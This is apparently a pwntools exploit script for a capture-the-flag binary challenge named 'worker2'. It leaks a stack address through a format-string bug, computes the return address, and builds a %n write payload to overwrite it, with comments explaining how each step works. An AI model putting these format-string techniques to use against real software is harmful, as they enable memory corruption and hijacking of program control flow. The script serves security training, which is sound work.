from dataclasses import dataclass
import time

import pwnlib.tubes.process as process
import pwnlib.tubes.remote as remote
import pwnlib.util.packing as packing
import pwnlib.fmtstr as fmtstr
from pwnlib.context import context

from interactive_nc import InteractiveNC
context.bits = 64
# nc = "c.unitedctf.ca"
# port = 10033
# r = remote.remote(nc,port)
r = process.process(["/mnt/c/Users/massi/Downloads/Source(1)/worker2"])


def readline(endOfLine="\n"):
    data = b""
    rec = ""
    while rec != bytes(endOfLine, "utf-8"):
        rec = r.recvn(1)
        data += rec
    return data.decode()


def readlines(number_of_lines: int, endOfLine="\n"):
    lines = []
    for _ in range(number_of_lines):
        lines += readline(endOfLine)
    return "".join(lines)


def readall():
    rec = r.recvall()
    return rec.decode()


def sendline(toSend):
    r.send(f"{toSend}\n".encode())


def sendbytes(toSend: bytes):
    r.send(toSend)   
    
interactive = InteractiveNC(r,command_prefix="!")
interactive.add_input("!b")
interactive.add_input("0")
interactive.add_input("%372$x")
interactive.add_input("!i")
interactive.add_input("!s 2 all addr")
interactive.add_input("!v off 3368")
interactive.add_input("!10 addr")
interactive.add_input("!+ addr off return_addr")
interactive.add_input("!v payload %4200224x%10$n12")
interactive.add_input("!16 return_addr")
interactive.add_input("!e util.packing.p64(int(return_addr, 16)+3368)")
interactive.add_input("!a payload last_eval_res fmtstr_payload")
interactive.add_input("!d hex")
interactive.interactive()
# Prints the first arg on the stack
# sendline("%6$s")
# "A%9$nAAA\0\0\0\0\0\x40\x40\x12" -> A %9$n AAA 0x0000000000404012 
# Length of input before %n is what is going to be written
# %9$n means that we are going to write in the pointer located at the 9th arguments position
# AKA 4th arg on the stack or rsp+0x18
# AAA is padding to reach the 9th argument
# 0x0000000000404012 is the address of the pointer we want to write to
# it is going to be stored at rsp+0x18
# Result: We write 1 to the address 0x0000000000404012
# sendbytes(b"A%9$nAAA" + packing.p64(0x404012) + b"\n")
# Leaks an address on the stack
# sendline("%372$x")
# res = readlines(15).split("\n")

# stack = int(res[2], 16)
# Difference between the address we leaked to and the location of the return address on the stack
# offset = 3368
# return_addr = stack + offset

# fmtstr_payload = b"%4200224x%10$n12"+packing.p64(return_addr)
#2534323030323234 63253131246c6c6e 48a0a4a8fc7f0000
#2534323030323234 632533246c6c6e61 f8c7d820fe7f0000